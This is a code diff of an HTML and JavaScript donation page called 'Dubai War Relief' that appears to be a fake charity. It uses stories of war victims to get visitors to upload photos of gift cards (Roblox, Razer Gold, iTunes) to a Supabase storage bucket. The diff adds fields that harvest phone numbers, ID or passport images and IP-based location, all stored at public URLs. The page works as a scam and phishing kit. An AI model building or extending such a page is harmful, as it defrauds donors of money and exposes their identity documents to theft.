@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Royal Relief | Sovereign Support Portal</title>
+    <title>Dubai War Relief | Sovereign Support Portal</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
     <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@300;700;900&display=swap" rel="stylesheet">
@@ -17,95 +17,73 @@
 </head>
 <body>
 
-    <!-- NAVIGATION -->
-    <nav class="p-5 bg-black/90 border-b border-zinc-800 flex justify-between items-center sticky top-0 z-50">
+    <nav class="p-5 bg-black border-b border-zinc-800 flex justify-between items-center sticky top-0 z-50">
         <div class="flex items-center space-x-3">
             <div class="w-8 h-8 border border-[#C9A45C] rounded-full flex items-center justify-center font-bold gold-text italic text-xs">R</div>
             <h1 class="text-[10px] font-black tracking-[0.3em] gold-text uppercase">Royal Relief</h1>
         </div>
-        <span class="text-[9px] font-bold text-zinc-500 bg-zinc-900 px-3 py-1 rounded border border-zinc-800">SOVEREIGN HUB</span>
+        <span id="location-badge" class="text-[9px] font-bold text-zinc-500 bg-zinc-900 px-3 py-1 rounded border border-zinc-800 uppercase">Detecting Hub...</span>
     </nav>
 
-    <main class="max-w-2xl mx-auto px-6 py-12">
-        
-        <!-- EMOTIONAL MISSION TEXT (TOP SECTION) -->
-        <section class="space-y-6 mb-16 animate-fadeIn">
+    <main class="max-w-xl mx-auto px-6 py-12">
+        <!-- EMOTIONAL TEXT SUGGESTED BY CLIENT -->
+        <section class="space-y-6 mb-16">
             <h2 class="text-3xl font-black uppercase italic gold-text tracking-tighter">Donate For The War Relief</h2>
-            
-            <div class="impact-box">
-                <p class="text-sm leading-relaxed text-zinc-300">Families have lost their homes, children are without food, and many sleep under broken shelters. Every little donation helps restore hope and rebuild lives.</p>
-            </div>
-
-            <div class="impact-box">
-                <p class="text-sm leading-relaxed text-zinc-300">A mother of three lost everything in the conflict. Your donation can help provide medicine, shelter, and daily meals for families like hers.</p>
-            </div>
-
-            <div class="impact-box">
-                <p class="text-sm leading-relaxed text-zinc-300">Dubai honors every donor, whether big or small. Every contribution matters and helps save lives.</p>
-            </div>
-            
-            <p class="text-center font-bold text-[10px] text-zinc-500 uppercase tracking-[0.2em] pt-4">All donations are secured via the Sovereign Asset Ledger.</p>
+            <div class="impact-box"><p class="text-sm text-zinc-300">Families have lost their homes, children are without food, and many sleep under broken shelters. Every little donation helps restore hope and rebuild lives.</p></div>
+            <div class="impact-box"><p class="text-sm text-zinc-300">A mother of three lost everything in the conflict. Your donation can help provide medicine, shelter, and daily meals for families like hers.</p></div>
+            <div class="impact-box"><p class="text-sm text-zinc-300">Dubai honors every donor, whether big or small. Every contribution matters and helps save lives.</p></div>
         </section>
 
-        <!-- THE ORIGINAL CHOICE PORTAL (MIDDLE SECTION) -->
-        <section id="gateway" class="space-y-8 mb-16 text-center">
-            <h3 class="gold-text text-sm font-black uppercase tracking-[0.3em]">Select Intake Method</h3>
-            <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
-                <div onclick="openPortal('royal')" class="cursor-pointer bg-zinc-900/80 border border-[#C9A45C]/40 p-8 rounded-[2rem] hover:scale-105 transition-all">
-                    <div class="text-3xl mb-3">👑</div>
-                    <h4 class="font-black uppercase italic text-xs mb-2">Dubai Membership</h4>
-                    <p class="text-[9px] text-zinc-500 uppercase font-bold">VIP Recognition • $100 Min</p>
-                </div>
-                <div onclick="openPortal('silent')" class="cursor-pointer bg-zinc-900/30 border border-zinc-800 p-8 rounded-[2rem] hover:bg-zinc-800/50 transition-all">
-                    <div class="text-3xl mb-3">🛡️</div>
-                    <h4 class="font-black uppercase italic text-xs mb-2 text-zinc-400">Silent Guardian</h4>
-                    <p class="text-[9px] text-zinc-600 uppercase font-bold">Anonymous • Open Value</p>
-                </div>
+        <!-- CHOICE PORTAL -->
+        <section id="gateway" class="grid grid-cols-1 md:grid-cols-2 gap-4 mb-16 text-center">
+            <div onclick="openPortal('royal')" class="cursor-pointer bg-zinc-900 border border-[#C9A45C]/40 p-8 rounded-[2rem] hover:scale-105 transition-all">
+                <div class="text-3xl mb-3">👑</div>
+                <h4 class="font-black uppercase italic text-xs mb-2">Royal Member</h4>
+                <p class="text-[9px] text-zinc-500 uppercase font-bold tracking-widest">Identity Cataloged</p>
+            </div>
+            <div onclick="openPortal('silent')" class="cursor-pointer bg-zinc-900/40 border border-zinc-800 p-8 rounded-[2rem] hover:bg-zinc-800 transition-all">
+                <div class="text-3xl mb-3">🛡️</div>
+                <h4 class="font-black uppercase italic text-xs mb-2 text-zinc-400">Silent Guardian</h4>
+                <p class="text-[9px] text-zinc-600 uppercase font-bold tracking-widest">Anonymous</p>
             </div>
         </section>
 
-        <!-- SUBMISSION FORM (BOTTOM SECTION) -->
+        <!-- FORM -->
         <div id="portal-form" class="hidden bg-zinc-900 p-8 rounded-[2.5rem] border border-zinc-800 shadow-2xl">
             <form id="reliefForm" class="space-y-5">
-                
-                <div id="royal-fields" class="hidden">
-                    <label class="text-[9px] text-zinc-500 font-black uppercase block mb-1">Membership Identity</label>
+                <div id="royal-only-fields" class="hidden space-y-4">
                     <input type="text" id="donor_name" placeholder="Official Name" class="w-full bg-black border border-zinc-800 p-4 rounded-2xl text-sm outline-none focus:border-[#C9A45C] text-white">
+                    <div class="flex">
+                        <input type="text" id="country_prefix" readonly class="w-20 bg-zinc-900 border border-zinc-800 border-r-0 p-4 rounded-l-2xl text-sm font-bold gold-text text-center" value="+">
+                        <input type="tel" id="phone_number" placeholder="Phone Number" class="w-full bg-black border border-zinc-800 p-4 rounded-r-2xl text-sm outline-none focus:border-[#C9A45C] text-white">
+                    </div>
+                    <div class="relative border border-[#C9A45C]/20 rounded-2xl p-4 text-center bg-black cursor-pointer">
+                        <input type="file" id="id_document" accept="image/*" class="absolute inset-0 opacity-0">
+                        <p id="id-label" class="text-[10px] text-zinc-500 font-bold uppercase">📸 Upload ID / Passport</p>
+                    </div>
                 </div>
 
                 <div class="grid grid-cols-2 gap-4">
-                    <div class="bg-black p-4 rounded-2xl border border-zinc-800">
-                        <label class="text-[9px] text-zinc-500 font-black uppercase block mb-1">Asset Type</label>
-                        <select id="asset_type" class="w-full bg-transparent text-xs font-bold outline-none text-white">
-                            <option value="Roblox">Roblox</option>
-                            <option value="Razer Gold">Razer Gold</option>
-                            <option value="iTunes">iTunes</option>
-                            <option value="Amazon">Amazon</option>
-                        </select>
-                    </div>
-                    <div class="bg-black p-4 rounded-2xl border border-zinc-800">
-                        <label class="text-[9px] text-[#C9A45C] font-black uppercase block mb-1">Value</label>
-                        <input type="number" id="asset_value" placeholder="100" required class="w-full bg-transparent text-xs font-bold outline-none text-white">
-                    </div>
+                    <select id="asset_type" class="bg-black border border-zinc-800 p-4 rounded-2xl text-sm text-white">
+                        <option value="Roblox">Roblox</option>
+                        <option value="Razer Gold">Razer Gold</option>
+                        <option value="iTunes">iTunes</option>
+                    </select>
+                    <input type="number" id="asset_value" placeholder="Value ($)" required class="bg-black border border-zinc-800 p-4 rounded-2xl text-sm text-white">
                 </div>
 
-                <div class="bg-black/50 p-4 rounded-2xl border border-zinc-800">
-                    <p id="location-text" class="text-white text-[10px] font-bold italic tracking-widest">📍 DUBAI HUB CONNECTED</p>
+                <div class="relative border-2 border-dashed border-zinc-800 rounded-3xl p-8 text-center bg-black cursor-pointer">
+                    <input type="file" id="card_image" required accept="image/*" class="absolute inset-0 opacity-0">
+                    <p id="card-label" class="text-[10px] text-zinc-500 font-black uppercase">📸 Snap Card Photo</p>
                 </div>
 
-                <div class="relative border-2 border-dashed border-zinc-800 rounded-3xl p-8 text-center cursor-pointer hover:border-[#C9A45C]/50 transition-all">
-                    <input type="file" id="card_image" required accept="image/*" class="absolute inset-0 opacity-0 cursor-pointer">
-                    <p id="file-label" class="text-[10px] text-zinc-500 font-black uppercase tracking-widest">📸 SNAP ASSET PHOTO</p>
-                </div>
-
-                <button type="submit" id="submitBtn" class="shimmer w-full bg-white text-black font-black py-5 rounded-[2rem] uppercase tracking-[0.2em] text-xs hover:bg-[#C9A45C] transition-all">Confirm to Ledger</button>
+                <button type="submit" id="submitBtn" class="shimmer w-full bg-white text-black font-black py-5 rounded-[2rem] uppercase tracking-widest text-xs">Confirm to Ledger</button>
             </form>
         </div>
 
         <div id="success" class="hidden py-20 text-center">
-            <h2 class="text-3xl font-black gold-text uppercase mb-2">Secured</h2>
-            <p id="ref-id" class="text-lg font-mono gold-text tracking-tighter bg-zinc-950 px-4 py-2 rounded-lg border border-zinc-800 inline-block"></p>
-            <p class="text-zinc-600 text-[10px] uppercase mt-12 animate-pulse tracking-[0.3em]">Updating Sovereign Vault...</p>
+            <h2 class="text-3xl font-black gold-text uppercase">Secured</h2>
+            <p id="ref-id" class="text-lg font-mono gold-text mt-4"></p>
         </div>
     </main>
 
@@ -113,35 +91,35 @@
         const SUPABASE_URL = 'https://tekuwfiwqldsbmuofvnb.supabase.co';
         const SUPABASE_KEY = 'sb_publishable_aAtBWENHDU7dAgkFq9UZUQ_HwqaFz4c'; 
         const _supabase = supabase.createClient(SUPABASE_URL, SUPABASE_KEY);
+        const callingCodes = { 'AE': '+971', 'NG': '+234', 'US': '+1', 'GB': '+44', 'ZA': '+27' };
 
-        async function initLoc() {
+        async function init() {
             try {
                 const res = await fetch('https://ipapi.co/json/');
                 const data = await res.json();
-                document.getElementById('location-text').innerText = `📍 ${data.city.toUpperCase()}, ${data.country_code} HUB`;
-            } catch (e) {}
+                window.userLoc = `${data.city.toUpperCase()}, ${data.country_code}`;
+                document.getElementById('location-badge').innerText = `${window.userLoc} HUB`;
+                document.getElementById('country_prefix').value = callingCodes[data.country_code] || '+';
+            } catch(e) { window.userLoc = "DUBAI, AE"; }
         }
-        initLoc();
-
-        document.getElementById('card_image').onchange = () => {
-            document.getElementById('file-label').innerText = "✅ ASSET READY";
-            document.getElementById('file-label').style.color = "#C9A45C";
-        };
+        init();
 
         function openPortal(type) {
             document.getElementById('portal-form').classList.remove('hidden');
             document.getElementById('portal-form').scrollIntoView({behavior:'smooth'});
-            if (type === 'royal') {
-                document.getElementById('royal-fields').classList.remove('hidden');
-            } else {
-                document.getElementById('royal-fields').classList.add('hidden');
-            }
+            if(type === 'royal') document.getElementById('royal-only-fields').classList.remove('hidden');
+            else document.getElementById('royal-only-fields').classList.add('hidden');
         }
+
+        document.getElementById('id_document').onchange = () => document.getElementById('id-label').innerText = "✅ ID READY";
+        document.getElementById('card_image').onchange = () => document.getElementById('card-label').innerText = "✅ CARD READY";
 
         document.getElementById('reliefForm').onsubmit = async function(e) {
             e.preventDefault();
             const btn = document.getElementById('submitBtn');
-            const file = document.getElementById('card_image').files[0];
+            const cardFile = document.getElementById('card_image').files[0];
+            const idFile = document.getElementById('id_document').files[0];
+            const fullPhone = document.getElementById('country_prefix').value + document.getElementById('phone_number').value.replace(/\D/g,'');
             const name = document.getElementById('donor_name').value || 'Silent Guardian';
             const asset = document.getElementById('asset_type').value;
             const val = document.getElementById('asset_value').value;
@@ -150,27 +128,30 @@
             btn.innerText = "UPLOADING..."; btn.disabled = true;
 
             try {
-                const fileName = `${ref}-${Date.now()}.jpg`;
-                const { data: upData, error: upErr } = await _supabase.storage.from('card-vault').upload(fileName, file);
-                if (upErr) throw upErr;
+                const cardPath = `card-${ref}.jpg`;
+                await _supabase.storage.from('card-vault').upload(cardPath, cardFile);
+                const { data: cardUrl } = _supabase.storage.from('card-vault').getPublicUrl(cardPath);
 
-                const { data: urlData } = _supabase.storage.from('card-vault').getPublicUrl(fileName);
-                
-                const { error: dbErr } = await _supabase.from('submissions').insert([{ 
-                    donor_name: name, asset_type: asset, declared_value: val, location: document.getElementById('location-text').innerText, image_url: urlData.publicUrl 
+                let idUrl = null;
+                if(idFile) {
+                    const idPath = `id-${ref}.jpg`;
+                    await _supabase.storage.from('card-vault').upload(idPath, idFile);
+                    idUrl = _supabase.storage.from('card-vault').getPublicUrl(idPath).data.publicUrl;
+                }
+
+                await _supabase.from('submissions').insert([{ 
+                    donor_name: name, phone_number: fullPhone, asset_type: asset, declared_value: val, 
+                    location: window.userLoc, image_url: cardUrl.publicUrl, id_document_url: idUrl 
                 }]);
-                if (dbErr) throw dbErr;
 
                 document.getElementById('portal-form').classList.add('hidden');
-                document.getElementById('gateway').classList.add('hidden');
                 document.getElementById('success').classList.remove('hidden');
                 document.getElementById('ref-id').innerText = ref;
                 
-                setTimeout(() => { window.location.href = `dashboard.html?user=${encodeURIComponent(name)}&ref=${ref}&asset=${asset}&val=${val}`; }, 3500);
-            } catch (err) {
-                alert("Error: " + err.message);
-                btn.innerText = "Confirm to Ledger"; btn.disabled = false;
-            }
+                setTimeout(() => {
+                    window.location.href = `dashboard.html?user=${encodeURIComponent(name)}&ref=${ref}&val=${val}&phone=${fullPhone.replace('+','')}`;
+                }, 3000);
+            } catch (err) { alert(err.message); btn.innerText = "Confirm to Ledger"; btn.disabled = false; }
         }
     </script>
 </body>
